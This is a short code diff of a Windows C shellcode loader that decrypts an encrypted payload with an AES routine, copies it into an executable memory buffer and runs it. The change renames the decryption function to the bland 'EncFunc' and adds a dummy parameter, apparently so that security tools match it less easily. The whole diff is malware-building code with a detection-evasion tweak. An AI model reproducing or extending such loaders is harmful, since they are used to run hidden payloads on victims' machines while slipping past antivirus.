@@ -64,7 +64,7 @@ unsigned char* load_file(const char *filename, long *file_size) {
 
 
 
-int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
+int EncFunc(int nothing, char * payload, unsigned int payload_len, char * key, size_t keylen) {
 	HCRYPTPROV hProv;
 	HCRYPTHASH hHash;
 	HCRYPTKEY hKey;
@@ -119,7 +119,7 @@ int main() {
 	}
 
 	// Decrypt the shellcode
-	if (AESDecrypt((char *)payload, payload_len, (char *)key, sizeof(key)) != 0) {
+	if (EncFunc(0, (char *)payload, payload_len, (char *)key, sizeof(key)) != 0) {
 		perror("Fehler bei der Entschlüsselung");
 		return 1; // Decryption failed
 	}
@@ -128,11 +128,9 @@ int main() {
 	// Pause for debugging purposes (remove in production)
 	getchar();
 
-
 	
 	// Copy decrypted payload to the allocated buffer
 	RtlMoveMemory(exec_mem, payload, payload_len);
-
 
 	
 	printf("execute the shellcode - press any key...:");
